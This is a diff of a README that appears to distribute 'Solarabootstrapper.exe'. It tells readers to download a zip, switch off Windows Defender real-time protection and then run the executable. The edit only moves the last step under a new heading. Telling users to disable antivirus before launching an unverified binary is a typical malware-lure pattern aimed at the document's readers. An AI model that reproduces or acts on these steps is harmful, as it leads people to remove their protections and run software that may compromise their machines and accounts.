@@ -36,7 +36,11 @@ First, download the zip file. Next, temporarily disable your antivirus software 
 2. Navigate to "Virus & threat protection."
 3. Click on "Manage settings."
 4. Disable "Real-time protection."
-After that, unzip the file using WinRAR or 7-Zip. Once extracted, navigate to the files and double-click on Solarabootstrapper.exe. With this, the process is complete.
+After that, unzip the file using WinRAR or 7-Zip. 
+
+### last step:
+
+Once extracted, navigate to the files and double-click on Solarabootstrapper.exe. With this, the process is complete.
 
 Take a look at the source code for more details.
 
